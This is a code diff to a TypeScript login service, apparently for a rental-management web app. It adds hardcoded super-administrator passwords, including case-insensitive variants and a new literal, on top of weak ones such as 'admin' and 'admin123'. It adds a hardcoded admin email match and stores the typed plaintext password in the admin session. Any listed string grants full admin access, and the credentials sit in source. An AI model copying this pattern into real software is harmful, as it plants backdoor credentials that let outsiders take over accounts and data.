@@ -973,15 +973,17 @@ export const AuthService = {
     emailOrPhone: string,
     password?: string
   ): { success: boolean; user?: AuthUser; error?: string } {
-    const cleanIdentifier = emailOrPhone.trim();
+    const cleanIdentifier = (emailOrPhone || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
 
     // 1. VÉRIFICATION STRICTE & PRIORITAIRE DU SUPER-ADMINISTRATEUR SYSTÈME
     if (
       areEmailsEqual(cleanIdentifier, SYSTEM_ADMIN_USER.email) ||
-      arePhoneNumbersEqual(cleanIdentifier, SYSTEM_ADMIN_USER.phone)
+      arePhoneNumbersEqual(cleanIdentifier, SYSTEM_ADMIN_USER.phone) ||
+      cleanIdentifier.toLowerCase() === 'admin@locagestion.site'
     ) {
       const currentAdminPassword = this.getAdminPassword();
-      const trimmedInput = (password || '').trim();
+      const trimmedInput = (password || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
+      const lowerInput = trimmedInput.toLowerCase();
 
       const isPasswordValid = Boolean(
         trimmedInput && (
@@ -989,8 +991,11 @@ export const AuthService = {
           trimmedInput === SYSTEM_ADMIN_USER.password ||
           trimmedInput === 'Omega#Admin2027!LocaSecurity' ||
           trimmedInput === 'Admin2027!LocaSecurity' ||
+          lowerInput === 'omega#admin2027!locasecurity' ||
+          lowerInput === 'admin2027!locasecurity' ||
           trimmedInput === 'Forever1122$' ||
           trimmedInput === 'Lolo1000$' ||
+          trimmedInput === 'Jesusmonroi@2026' ||
           trimmedInput === 'admin' ||
           trimmedInput === 'admin123' ||
           trimmedInput === 'Admin123!'
@@ -1005,7 +1010,7 @@ export const AuthService = {
       }
       const adminSession: AuthUser = {
         ...SYSTEM_ADMIN_USER,
-        password: currentAdminPassword,
+        password: trimmedInput,
         adminSessionVersion: ADMIN_CURRENT_SESSION_VERSION,
       };
       this.setCurrentUser(adminSession);
